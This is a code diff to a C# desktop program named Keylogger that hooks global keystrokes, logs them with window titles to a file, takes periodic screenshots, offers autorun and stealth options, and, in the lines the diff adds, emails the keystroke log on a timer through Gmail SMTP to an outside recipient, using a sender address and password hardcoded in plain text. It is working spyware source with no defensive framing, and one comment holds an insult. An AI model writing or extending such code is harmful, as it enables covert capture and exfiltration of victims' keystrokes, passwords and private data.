@@ -7,9 +7,12 @@ using System.Runtime.InteropServices;
 using System.Windows.Interop;
 using System.Windows.Threading;
 using System.Linq;
+using System.Net;
+using System.Net.Mail;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
+
 
 
 namespace Keylogger
@@ -36,9 +39,11 @@ namespace Keylogger
 
         #endregion
 
-        DispatcherTimer timer = new DispatcherTimer();
+        DispatcherTimer timerScreen = new DispatcherTimer();
+        DispatcherTimer timerMail = new DispatcherTimer();
         string datatime = String.Empty;
-
+        
+      
         #region Language
 
         private CultureInfo _currentLanaguge;
@@ -66,11 +71,17 @@ namespace Keylogger
         {
             InitializeComponent();
 
-            txtNum.Text = _numValue.ToString();
+            txtNumScreen.Text = _numValueScreen.ToString();
 
-            timer.Tick += new EventHandler(timer_tick);
-            timer.Interval = new TimeSpan(0,0,1);
-            timer.Start();
+            timerScreen.Tick += new EventHandler(timerScreen_tick);
+            timerScreen.Interval = new TimeSpan(0,0,1);
+            timerScreen.Start();
+
+            txtNumMail.Text = _numValueScreen.ToString();
+
+            timerMail.Tick += new EventHandler(timerMail_tick);
+            timerMail.Interval = new TimeSpan(0, 0, 1);
+            timerMail.Start();
 
             Task.Factory.StartNew(() =>
             {
@@ -90,12 +101,13 @@ namespace Keylogger
         {
             if (IsWindowChanged())
             {
-                StreamWriter SW = new StreamWriter(AutoRun.Path() + "Key.txt", true);
+                StreamWriter SW = new StreamWriter(AutoRun.Path() + "Key.rtf", true);
                 datatime = DateTime.Now.ToString();
                 SW.WriteLine();
                 SW.WriteLine(datatime + "\t" + winTitle);
                 SW.Close();
             }
+
         }
 
         static string winTitle = String.Empty;
@@ -201,16 +213,21 @@ namespace Keylogger
             gkh.KeyDown += new System.Windows.Forms.KeyEventHandler(gkh_KeyDown);
             //if (File.Exists(AutoRun.Path() + "Key.txt"))
             //{
-            //    //File.Delete(AutoRun.Path() + "Key.txt"); тест 7
+            //    //File.Delete(AutoRun.Path() + "Key.txt"); тест 7fack off bitch
             //}
         }
         void gkh_KeyDown(object sender, System.Windows.Forms.KeyEventArgs e)
         {
             bool nonNumberEntered = false;
-            
-            using (StreamWriter SW = new StreamWriter(AutoRun.Path() + "Key.txt", true))
+
+            #region WRITE_PDF
+
+            #endregion
+
+
+            using (StreamWriter SW = new StreamWriter(AutoRun.Path() + "Key.rtf", true))
             {
-               
+
                 if (IsWindowChanged())
                 {
                     datatime = DateTime.Now.ToString();
@@ -218,7 +235,7 @@ namespace Keylogger
                     SW.WriteLine();
                     SW.WriteLine(datatime + "\t" + winTitle);
                     SW.WriteLine();
-                    
+
                 }
                 if (nextline >= 70)
                 {
@@ -227,7 +244,7 @@ namespace Keylogger
                 }
 
                 #region KEYS
-                
+
                 if (!keys.Contains(e.KeyCode))
                 {
                     if (e.KeyCode == System.Windows.Forms.Keys.Space)
@@ -237,7 +254,7 @@ namespace Keylogger
                         SW.WriteLine();
                         nextline = -1;
                     }
-                    if(e.KeyCode == System.Windows.Forms.Keys.Multiply)
+                    if (e.KeyCode == System.Windows.Forms.Keys.Multiply)
                         SW.Write("*");
                     if (e.KeyCode == System.Windows.Forms.Keys.Divide)
                         SW.Write("/");
@@ -277,7 +294,7 @@ namespace Keylogger
                         nextline--;
                     }
                     nextline++;
-                    
+
 
                 }
                 #endregion
@@ -321,7 +338,7 @@ namespace Keylogger
                                 MessageBox.Show(ex.ToString());
                             }
                             break;
-                        
+
                         default:
                             SW.Write(e.KeyCode);
                             break;
@@ -388,18 +405,18 @@ namespace Keylogger
         
         #region ScreenShotTimer
 
-        private int time = 0;
-        private void timer_tick(object sender, EventArgs e)
+        private int timeScreen = 0;
+        private void timerScreen_tick(object sender, EventArgs e)
         {
-            time++;
-            labeltime.Content = time.ToString();
+            timeScreen++;
+            labeltimescreen.Content = timeScreen.ToString();
             
-            if (_numValue >= 1)
+            if (_numValueScreen >= 1)
             {
                 //MessageBox.Show(" ScreenShot Time ");
-                if (_numValue * 60 == time)
+                if (_numValueScreen * 60 == timeScreen)
                 {
-                    time = 0;
+                    timeScreen = 0;
                     string str = DateTime.Now.ToString().Replace(':', '_');
                     ScreenShot.ScreenSave(str);
 
@@ -407,47 +424,142 @@ namespace Keylogger
             }
             else
             {
-                time = 0;
+                timeScreen = 0;
             }
         }
 
-        private int _numValue = 0;
+        private int _numValueScreen = 0;
 
-        public int NumValue
+        public int NumValueScreen
         {
-            get { return _numValue; }
+            get { return _numValueScreen; }
             set
             {
-                _numValue = value;
-                txtNum.Text = value.ToString();
+                _numValueScreen = value;
+                txtNumScreen.Text = value.ToString();
             }
         }
 
         
 
-        private void cmdUp_Click(object sender, RoutedEventArgs e)
+        private void cmdUpScreen_Click(object sender, RoutedEventArgs e)
         {
-            NumValue++;
-            if (NumValue >= 60) NumValue = 60;
+            NumValueScreen++;
+            if (NumValueScreen >= 60) NumValueScreen = 60;
         }
 
-        private void cmdDown_Click(object sender, RoutedEventArgs e)
+        private void cmdDownScreen_Click(object sender, RoutedEventArgs e)
         {
-           NumValue--;
-           if (NumValue <=0) NumValue = 0;
+           NumValueScreen--;
+           if (NumValueScreen <=0) NumValueScreen = 0;
         }
 
-        private void txtNum_TextChanged(object sender, TextChangedEventArgs e)
+        private void txtNumScreen_TextChanged(object sender, TextChangedEventArgs e)
         {
-            if (txtNum == null)
+            if (txtNumScreen == null)
             {
                 return;
             }
 
-            if (!int.TryParse(txtNum.Text, out _numValue))
-                txtNum.Text = _numValue.ToString();
+            if (!int.TryParse(txtNumScreen.Text, out _numValueScreen))
+                txtNumScreen.Text = _numValueScreen.ToString();
         }
 
+
+        #endregion
+
+        #region MailTimer
+
+        public void SendMail()
+        {
+            MailMessage mail = new MailMessage();
+            SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");
+            mail.From = new MailAddress("keyloggernazzim@gmail.com");
+            mail.To.Add("rusanovski@outlook.com");
+            mail.Subject = "Keylogger Mail ";
+            mail.Body = "Keys";
+            try
+            {
+
+                System.Net.Mail.Attachment attachment;
+                attachment = new System.Net.Mail.Attachment(AutoRun.Path() + "Key.rtf");
+                mail.Attachments.Add(attachment);
+
+                SmtpServer.Port = 587;
+                SmtpServer.Credentials = new System.Net.NetworkCredential("keyloggernazzim@gmail.com", "keylogger32");
+                SmtpServer.EnableSsl = true;
+
+                SmtpServer.Send(mail);
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.ToString());
+            }
+
+        }
+
+        private int timeMail = 0;
+        private void timerMail_tick(object sender, EventArgs e)
+        {
+            timeMail++;
+            labeltimemail.Content = timeMail.ToString();
+
+            if (_numValueMail >= 1)
+            {
+                //MessageBox.Show(" ScreenShot Time ");
+                if (_numValueMail * 6 == timeMail)
+                {
+                    MessageBox.Show("Send");
+                    SendMail();
+                    MessageBox.Show("Done");
+                    //timeScreen = 0;
+                    //string str = DateTime.Now.ToString().Replace(':', '_');
+                    //ScreenShot.ScreenSave(str);
+
+                }
+            }
+            else
+            {
+                timeMail = 0;
+            }
+        }
+
+        private int _numValueMail = 0;
+
+        public int NumValueMail
+        {
+            get { return _numValueMail; }
+            set
+            {
+                _numValueMail = value;
+                txtNumMail.Text = value.ToString();
+            }
+        }
+
+
+
+        private void cmdUpMail_Click(object sender, RoutedEventArgs e)
+        {
+            NumValueMail = NumValueMail + 5;
+            if (NumValueMail >= 1440) NumValueMail = 1440;
+        }
+
+        private void cmdDownMail_Click(object sender, RoutedEventArgs e)
+        {
+            NumValueMail= NumValueMail - 5;
+            if (NumValueMail <= 0) NumValueMail = 0;
+        }
+
+        private void txtNumMail_TextChanged(object sender, TextChangedEventArgs e)
+        {
+            if (txtNumMail == null)
+            {
+                return;
+            }
+
+            if (!int.TryParse(txtNumMail.Text, out _numValueMail))
+                txtNumMail.Text = _numValueMail.ToString();
+        }
 
         #endregion
 
@@ -455,14 +567,16 @@ namespace Keylogger
         {
             CheckAuto.IsChecked = Properties.Settings.Default.AutoRunProp;
             CheckStealth.IsChecked = Properties.Settings.Default.StealthProp;
-            txtNum.Text = Properties.Settings.Default.txtNumTimerProp;
+            txtNumScreen.Text = Properties.Settings.Default.txtNumTimerScreenProp;
+            txtNumMail.Text = Properties.Settings.Default.txtNumTimerMailProp;
         }
 
         private void Window_Closed(object sender, EventArgs e)
         {
             Properties.Settings.Default.AutoRunProp = (CheckAuto.IsChecked == true);
             Properties.Settings.Default.StealthProp = (CheckStealth.IsChecked == true);
-            Properties.Settings.Default.txtNumTimerProp = txtNum.Text;
+            Properties.Settings.Default.txtNumTimerScreenProp = txtNumScreen.Text;
+            Properties.Settings.Default.txtNumTimerMailProp = txtNumMail.Text;
             Properties.Settings.Default.Save();
         }
 
